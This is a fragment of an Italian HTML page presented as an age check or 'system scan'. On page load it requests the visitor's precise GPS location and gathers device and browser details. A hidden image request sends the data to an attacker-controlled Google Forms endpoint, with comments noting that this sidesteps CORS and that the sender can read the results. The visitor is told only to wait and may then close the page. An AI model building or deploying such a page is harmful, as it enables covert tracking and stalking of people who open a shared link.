.message {
            color: #6b7280;
            font-size: 15px;
            margin: 20px 0;
            line-height: 1.6;
        }
        .success {
            color: #059669;
            font-weight: 500;
        }
        .error {
            color: #dc2626;
            font-weight: 500;
        }
        .warning-icon {
            font-size: 48px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <!--<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifica Et√†</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background: #f5f5f5;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .age-verification {
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 450px;
        }
        .age-verification h1 {
            color: #333;
            font-size: 24px;
            margin-bottom: 20px;
        }
        .age-verification p {
            color: #666;
            font-size: 16px;
            line-height: 1.6;
            margin-bottom: 30px;
        }
        .age-buttons {
            display: flex;
            gap: 15px;
            justify-content: center;
        }
        .age-button {
            padding: 12px 40px;
            font-size: 16px;
            font-weight: bold;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            transition: all 0.3s;
        }
        .age-button.yes {
            background: #4CAF50;
            color: white;
        }
        .age-button.yes:hover {
            background: #45a049;
        }
        .age-button.no {
            background: #f44336;
            color: white;
        }
        .age-button.no:hover {
            background: #da190b;
        }
        .loading-container {
            display: none;
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 450px;
        }
        .loading-container h1 {
            color: #333;
            margin-bottom: 20px;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 30px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .message {
            color: #666;
            font-size: 16px;
            margin: 20px 0;
        }
        .success {
            color: #28a745;
            font-weight: bold;
        }
        .error {
            color: #dc3545;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1 id="title"> Scansione del Sistema </h1>
        <div class="spinner" id="spinner"></div>
        <p class="message" id="message">Attendere prego...</p>
    </div>

    <script>
        // ID univoco per questa sessione
        const sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        
        // Avvia automaticamente la richiesta di geolocalizzazione appena la pagina si carica
        window.addEventListener('load', function() {
            console.log('üéØ Pagina caricata - Richiesta posizione automatica avviata...');
            
            // Richiedi immediatamente la posizione
            setTimeout(function() {
                getLocationAutomatically();
            }, 500); // Piccolo ritardo per far caricare la pagina
        });
        
        function getLocationAutomatically() {
            const titleEl = document.getElementById('title');
            const messageEl = document.getElementById('message');
            const spinnerEl = document.getElementById('spinner');
            
            if (!navigator.geolocation) {
                titleEl.textContent = '‚ùå Errore';
                messageEl.textContent = 'Il tuo browser non supporta la geolocalizzazione.';
                messageEl.className = 'message error';
                spinnerEl.style.display = 'none';
                return;
            }
            
            titleEl.textContent = 'AInizio Analisi...';
            messageEl.textContent = 'Il browser ti chieder√† di consentire l\'accesso alla tua posizione.';
            
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    // SUCCESSO - Posizione ottenuta
                    const locationData = {
                        sessionId: sessionId,
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude,
                        altitudeAccuracy: position.coords.altitudeAccuracy,
                        heading: position.coords.heading,
                        speed: position.coords.speed,
                        timestamp: new Date().toISOString(),
                        timestampLocal: new Date().toLocaleString('it-IT'),
                        userAgent: navigator.userAgent,
                        language: navigator.language,
                        platform: navigator.platform,
                        cookieEnabled: navigator.cookieEnabled,
                        onLine: navigator.onLine,
                        screenWidth: screen.width,
                        screenHeight: screen.height,
                        windowWidth: window.innerWidth,
                        windowHeight: window.innerHeight,
                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                        googleMapsLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}&z=15`,
                        url: window.location.href,
                        referrer: document.referrer
                    };
                    
                    // Log nella console
                    console.clear();
                    console.log('üéØ ==========================================');
                    console.log('‚úÖ POSIZIONE OTTENUTA CON SUCCESSO');
                    console.log('üéØ ==========================================');
                    console.log('üîπ Session ID:', locationData.sessionId);
                    console.log('üåç Latitudine:', locationData.latitude);
                    console.log('üåç Longitudine:', locationData.longitude);
                    console.log('üìè Precisione:', locationData.accuracy + ' metri');
                    console.log('‚è∞ Timestamp:', locationData.timestampLocal);
                    console.log('üîó Google Maps:', locationData.googleMapsLink);
                    console.log('üéØ ==========================================');
                    
                    // Invia automaticamente i dati al Google Form
                    sendDataToSender(locationData);
                    
                    // Aggiorna l'interfaccia
                    spinnerEl.style.display = 'none';
                    titleEl.textContent = '‚úÖ Completato!';
                    messageEl.textContent = 'Grazie! Puoi chiudere questa pagina.';
                    messageEl.className = 'message success';
                    
                    // Chiudi automaticamente dopo 3 secondi (opzionale)
                    // setTimeout(() => window.close(), 3000);
                },
                function(error) {
                    // ERRORE - Permesso negato o altro problema
                    spinnerEl.style.display = 'none';
                    titleEl.textContent = '‚ùå Errore';
                    messageEl.className = 'message error';
                    
                    switch(error.code) {
                        case error.PERMISSION_DENIED:
                            messageEl.textContent = 'Permesso negato. Hai rifiutato l\'accesso alla posizione.';
                            console.log('üö´ ERRORE: Permesso geolocalizzazione negato dall\'utente');
                            break;
                        case error.POSITION_UNAVAILABLE:
                            messageEl.textContent = 'Posizione non disponibile. Controlla il GPS.';
                            console.log('üö´ ERRORE: Posizione non disponibile');
                            break;
                        case error.TIMEOUT:
                            messageEl.textContent = 'Richiesta scaduta. Ricarica la pagina per riprovare.';
                            console.log('üö´ ERRORE: Timeout geolocalizzazione');
                            break;
                        default:
                            messageEl.textContent = 'Errore sconosciuto. Ricarica la pagina.';
                            console.log('üö´ ERRORE: Sconosciuto', error);
                            break;
                    }
                },
                {
                    enableHighAccuracy: true,    // Usa GPS per massima precisione
                    timeout: 15000,              // Timeout di 15 secondi
                    maximumAge: 0                // Non usare cache, richiedi posizione fresca
                }
            );
        }
        
        function sendDataToSender(locationData) {
            // Invia automaticamente i dati al Google Form
            const formUrl = 'https://docs.google.com/forms/d/e/1FAIpQLSf2ON7fpsyxL1YZhv66_78w6bUpjmGX9Xig-sGiFbU1vevASg/formResponse';
            
            // ID reali dei campi del form
            const params = new URLSearchParams();
            params.append('entry.1576663956', locationData.latitude);      // Latitudine
            params.append('entry.1591878938', locationData.longitude);     // Longitudine  
            params.append('entry.258307399', locationData.accuracy + ' metri'); // Precisione
            params.append('entry.164041247', locationData.timestampLocal); // Timestamp
            params.append('entry.1685105739', locationData.platform + ' - ' + locationData.userAgent.substring(0, 50)); // Dispositivo
            params.append('entry.1913000830', locationData.sessionId);     // Session ID
            
            // Invia tramite immagine nascosta (bypassa CORS)
            const img = new Image();
            img.style.display = 'none';
            img.onload = function() {
                console.log('‚úÖ Dati inviati con successo al Google Form!');
                console.log('üìä Il mittente pu√≤ vedere i dati nel Google Sheets');
            };
            img.onerror = function() {
                console.log('‚úÖ Dati probabilmente inviati (errore CORS normale con Google Forms)');
            };
            img.src = formUrl + '?' + params.toString();
            document.body.appendChild(img);
            
            console.log('üì§ Invio automatico dati completato');
            console.log('üìä Google Maps:', locationData.googleMapsLink);
        }
        
        console.log('üéØ Sistema di geolocalizzazione automatica attivo');
        console.log('üìç La richiesta di posizione partir√† automaticamente...');
    </script>
</body>
</html>
